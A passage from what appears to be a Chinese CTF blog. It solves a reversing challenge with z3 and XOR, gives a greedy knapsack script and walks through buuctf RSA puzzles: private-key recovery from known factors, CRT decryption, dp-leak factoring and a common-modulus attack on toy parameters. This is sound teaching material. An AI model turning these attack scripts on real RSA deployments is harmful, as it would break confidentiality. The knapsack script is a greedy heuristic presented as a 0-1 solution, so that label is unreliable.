<span class="keyword">if</span> (xorr[<span class="number">0</span>] - <span class="number">652</span>) * <span class="number">2</span> - xorr[<span class="number">1</span>] * <span class="number">366</span> + xorr[<span class="number">2</span>] * <span class="number">233</span> + xorr[<span class="number">3</span>] / <span class="number">2</span> - <span class="number">13333</span> == <span class="number">13509025</span>:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">                            ans[i] = flag[i] ^ xorr[i % <span class="number">4</span>]</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                                f.write(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(a) <span class="keyword">for</span> a <span class="keyword">in</span> ans]))</span><br></pre></td></tr></table></figure><p>这里的逻辑也很简单，当游戏结束时，要满足if语句中的条件才能得到flag文件，这里直接用z3约束器求得xorr列表，再进行亦或即可，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">178868</span>, <span class="number">188</span>, <span class="number">56953</span>, <span class="number">2413</span>, <span class="number">178874</span>, <span class="number">131</span>, <span class="number">56957</span>, <span class="number">2313</span>, <span class="number">178867</span>, <span class="number">156</span>,</span><br><span class="line">         <span class="number">56933</span>, <span class="number">2377</span>, <span class="number">178832</span>, <span class="number">202</span>, <span class="number">56899</span>, <span class="number">2314</span>, <span class="number">178830</span>, <span class="number">167</span>, <span class="number">56924</span>,</span><br><span class="line">         <span class="number">2313</span>, <span class="number">178830</span>, <span class="number">167</span>, <span class="number">56938</span>, <span class="number">2383</span>, <span class="number">178822</span>, <span class="number">217</span>, <span class="number">56859</span>, <span class="number">2372</span>]</span><br><span class="line">flagg=<span class="string">&quot;&quot;</span></span><br><span class="line">a,b,c,d=Ints(<span class="string">&#x27;a b c d&#x27;</span>)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(a * <span class="number">256</span> - b / <span class="number">2</span> + c * <span class="number">23</span> + d / <span class="number">2</span> == <span class="number">47118166</span>)</span><br><span class="line">s.add(a * <span class="number">252</span> - b * <span class="number">366</span> + c * <span class="number">23</span> + d / <span class="number">2</span> - <span class="number">1987</span> == <span class="number">46309775</span>)</span><br><span class="line">s.add(a * <span class="number">6</span> - b * <span class="number">88</span> + c / <span class="number">2</span> + d / <span class="number">2</span> - <span class="number">11444</span> == <span class="number">1069997</span>)</span><br><span class="line">s.add((a - <span class="number">652</span>) * <span class="number">2</span> - b * <span class="number">366</span> + c * <span class="number">233</span> + d / <span class="number">2</span> - <span class="number">13333</span> == <span class="number">13509025</span>)</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())<span class="comment">#[d = 2360, a = 178940, b = 248, c = 56890]</span></span><br><span class="line">xorr=[<span class="number">178940</span>,<span class="number">248</span>,<span class="number">56890</span>,<span class="number">2361</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flagg+=<span class="built_in">chr</span>(flag[i]^xorr[i%<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flagg)</span><br></pre></td></tr></table></figure><p>但是这里出现了一个小问题，解出来的值最后一个数应该加上1才能得到完整的flag，可能是出题人弄错了，但是根据flag的格式也能得到。</p><h2 id="买了些什么呢"><a href="#买了些什么呢" class="headerlink" title="买了些什么呢"></a>买了些什么呢</h2><h3 id="典型0-1背包问题"><a href="#典型0-1背包问题" class="headerlink" title="典型0-1背包问题"></a><a href="https://www.cnblogs.com/xym4869/p/8513801.html">典型0-1背包问题</a></h3><p>直接拿出珍藏多年的01背包问题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">good</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, eavy, value</span>):</span><br><span class="line">        self.num = num</span><br><span class="line">        self.value = value</span><br><span class="line">        self.eavy = eavy</span><br><span class="line">        self.avgvalue = value / eavy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">money = <span class="number">0</span></span><br><span class="line">weigt = <span class="number">50</span> <span class="comment">#重量</span></span><br><span class="line">count = <span class="number">40</span> <span class="comment">#容量</span></span><br><span class="line">goodlist = <span class="built_in">list</span>()</span><br><span class="line">flag = <span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    num, eavy, value = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    goodlist.append(good(num, eavy, value))</span><br><span class="line">avglist = <span class="built_in">sorted</span>(goodlist, key=<span class="keyword">lambda</span> i: i.avgvalue, reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    <span class="keyword">if</span> weigt &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> avglist[i].eavy &lt;= weigt:</span><br><span class="line">        weigt -= avglist[i].eavy</span><br><span class="line">        money += avglist[i].value</span><br><span class="line">        flag.append(avglist[i].num)</span><br><span class="line"></span><br><span class="line">flag.sort()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] -= <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(money, weigt)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure><p>输入回显的数据即可，注意修改weigt 和 count</p>]]></content>
      
      
      <categories>
          
          <category> reserve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛事复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rsa加密系列</title>
      <link href="/2023/04/09/Rsa%E5%8A%A0%E5%AF%86%E7%B3%BB%E5%88%97/"/>
      <url>/2023/04/09/Rsa%E5%8A%A0%E5%AF%86%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RSA加密系列"><a href="#RSA加密系列" class="headerlink" title="RSA加密系列"></a>RSA加密系列</h1><h2 id="什么是RSA加密"><a href="#什么是RSA加密" class="headerlink" title="什么是RSA加密"></a>什么是RSA加密</h2><p>rsa加密是一种<a href="https://zhuanlan.zhihu.com/p/436455172">非对称加密算法</a>（公钥加密），对于rsa加密主要就是有公钥是私钥两种概念，公钥用于发送方将明文进行加密，私钥是接收方得到密文后用其解密得到明文，加密方式和解密方式不同，导致rsa加密比对称加密更加安全</p><h2 id="普通rsa加密解密公式"><a href="#普通rsa加密解密公式" class="headerlink" title="普通rsa加密解密公式"></a>普通rsa<a href="https://blog.csdn.net/dbs1215/article/details/48953589">加密解密公式</a></h2><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>补充其中求L的过程，这里的L&#x3D;φ(n)，根据欧拉函数，φ(n)&#x3D;φ(p*q)&#x3D;φ(p)xφ(q)</p><p>我们知道如果a为质数，那么φ(a)&#x3D;a-1，则可以得到φ(n)&#x3D;(p-1)x(q-1)</p><h3 id="欧拉定理和模反元素-逆元"><a href="#欧拉定理和模反元素-逆元" class="headerlink" title="欧拉定理和模反元素(逆元)"></a>欧拉定理和模反元素(逆元)</h3><p>欧拉函数的用处，在于欧拉定理<br>“欧拉定理”指的是:<br>如果两个正整数a和n互质，则n的欧拉函数φ(n)可以让下面的等式成立：<br>a^φ(n)≡1(mod n)<br>也就是说，a的φ(n)次方被n除的余数为1</p><p>模反元素的推导过程如下:<br>根据欧拉定理，有：<br>a^φ(n) &#x3D; a × a^(φ(n)−1)≡1(mod n)</p><p>令b&#x3D;a^(φ(n)−1)，得：</p><p>ab≡1(mod n)<br>b就是a的模反元素(逆元)<br>所以，如果两个正整数a和n互质，那么一定可以找到整数b使得ab-1被n整除，或者说ab被n除的余数是1</p><p>所以求私钥d的公式：d*e≡1 mod [(p-1)(q-1)]</p><p>其中{φ(n) &#x3D; (p-1)(q-1),φ(n) 与e互质，k为正整数<br>可化为：d&#x3D; (k*φ(n)+1)&#x2F;e</p><h4 id="buuctf-rsa"><a href="#buuctf-rsa" class="headerlink" title="buuctf rsa"></a>buuctf rsa</h4><h5 id="打开pub-key"><a href="#打开pub-key" class="headerlink" title="打开pub.key"></a>打开pub.key</h5><p>得到公钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+</span><br><span class="line">/AvKr1rzQczdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>把公钥拿去解析：<a href="http://www.hiencode.com/pub_asys.html">http://www.hiencode.com/pub_asys.html</a></p><p>得到e和n的值，再将n拿去解析：<a href="http://www.factordb.com/">http://www.factordb.com</a></p><p>得到p和q的值，这时就可以通过e，n，p，q拿到对文件内容解密的私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)<span class="comment">#invert是一个求逆元的函数</span></span><br><span class="line">key=rsa.PrivateKey(n,e,<span class="built_in">int</span>(d),p,q)<span class="comment">#文件内容不是单纯的数字，私钥就应该是n,e,p,q的组合</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\\rsa\\output\\flag.enc&quot;</span>,<span class="string">&quot;rb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f=f.read()</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(f,key))</span><br></pre></td></tr></table></figure><p>得到明文：flag{decrypt_256}</p><h4 id="buuctf-RSA"><a href="#buuctf-RSA" class="headerlink" title="buuctf RSA"></a>buuctf RSA</h4><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</span><br><span class="line">求解出d作为flga提交</span><br></pre></td></tr></table></figure><p>直接根据公式求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>得到flag：flag{125631357777427553}</p><h4 id="buuctf-rsarsa"><a href="#buuctf-rsarsa" class="headerlink" title="buuctf rsarsa"></a>buuctf rsarsa</h4><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e =  65537</span><br><span class="line">c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">Use RSA to find the secret message</span><br></pre></td></tr></table></figure><p>这里得到密文，通过公式，用c，d，n求出明文即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">n=p*q</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">flag=<span class="built_in">pow</span>(c,d,n)<span class="comment">#由于这里的密文是数字，可以直接通过公式拿到明文</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>直接得到flag：flag{5577446633554466577768879988}</p><h2 id="更为安全的rsa加密"><a href="#更为安全的rsa加密" class="headerlink" title="更为安全的rsa加密"></a>更为安全的rsa加密</h2><h3 id="dp-dq-p-q-c的加密算法"><a href="#dp-dq-p-q-c的加密算法" class="headerlink" title="dp,dq,p,q,c的加密算法"></a><a href="https://blog.csdn.net/MikeCoke/article/details/105959599">dp,dq,p,q,c的加密算法</a></h3><p>题目一般会将这5个数全部给出,这篇<a href="https://blog.csdn.net/MikeCoke/article/details/105959599">博客</a>很详细</p><p>解密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">I = gmpy2.invert(q,p)<span class="comment">#相当于是q*I mod p=1求q模p的逆元I</span></span><br><span class="line">mp = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c,dq,q)               <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = (((mp-mq)*I)%p)*q+mq       <span class="comment">#求明文公式，这里我惊奇地发现直接用mp或是mq作为flag也是对的！！！那么这种题就简单了，但在直接用的方法失效时，还是应该套用公式</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))          <span class="comment">#转为十六进制</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="buuctf-RSA1"><a href="#buuctf-RSA1" class="headerlink" title="buuctf RSA1"></a>buuctf RSA1</h4><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure><p>题目把所有元素均给出，只需要代入公式即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">I=gmpy2.invert(q,p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mp=<span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">mq=<span class="built_in">pow</span>(c,dq,q)</span><br><span class="line">flag1=mq<span class="comment">#这里是我做的测试，发现最终得到的flag都一样</span></span><br><span class="line">flag2=(mp-mq)*I%p*q+mq</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag1)[<span class="number">2</span>:]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag2)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>flag：flag{W31c0m3_70_Ch1n470wn}</p><h3 id="dp泄漏"><a href="#dp泄漏" class="headerlink" title="dp泄漏"></a>dp泄漏</h3><p>题目给出e，n，dp，C，需要求出明文，思路就是去求d</p><p><img src="/2023/04/09/Rsa%E5%8A%A0%E5%AF%86%E7%B3%BB%E5%88%97/dp.jpg"></p><p><img src="/2023/04/09/Rsa%E5%8A%A0%E5%AF%86%E7%B3%BB%E5%88%97/dp1.jpg"></p><h4 id="buuctf-RSA2"><a href="#buuctf-RSA2" class="headerlink" title="buuctf RSA2"></a>buuctf RSA2</h4><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br></pre></td></tr></table></figure><p>直接代入公式写脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">    <span class="keyword">if</span> (e*dp-<span class="number">1</span>)%i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%((e*dp-<span class="number">1</span>)//i+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">            p=(e*dp-<span class="number">1</span>)//i+<span class="number">1</span></span><br><span class="line">            q=n//p</span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))<span class="comment">#将得到的明文以16进制文本形式输出</span></span><br></pre></td></tr></table></figure><p>可以直接分解n</p><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a><a href="https://blog.csdn.net/MikeCoke/article/details/106065200">共模攻击</a></h3><p>直接在数学模型基础上，以公式m&#x3D;(c1^s1+c2^s2) mod n可以解出明文</p><p>共模攻击是在两密文有相同的取模方式的情况下，不用求得d1，d2直接得出明文，由于gcd(e1,e2)&#x3D;1,可以由<a href="https://blog.csdn.net/destiny1507/article/details/81750874">扩展欧几里得算法</a>得到相应的s1和s2，从而得到明文</p><p>解题代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c1=</span><br><span class="line">c2=</span><br><span class="line">e1=</span><br><span class="line">e2=</span><br><span class="line">n=</span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)<span class="comment">#python中扩展欧几里得算法会返回三个值，分别是e1与e2的最大公约数s，以及满足e1*s1+e2*s2=s式子的s1和s2</span></span><br><span class="line">flag=(<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br></pre></td></tr></table></figure><h4 id="buuctf-RSA3"><a href="#buuctf-RSA3" class="headerlink" title="buuctf RSA3"></a>buuctf RSA3</h4><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">e1=11187289</span><br><span class="line">c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e2=9647291</span><br></pre></td></tr></table></figure><p>题目给出e1，e2，c1，c2，共模n，那么就可以直接进行共模攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">c2=<span 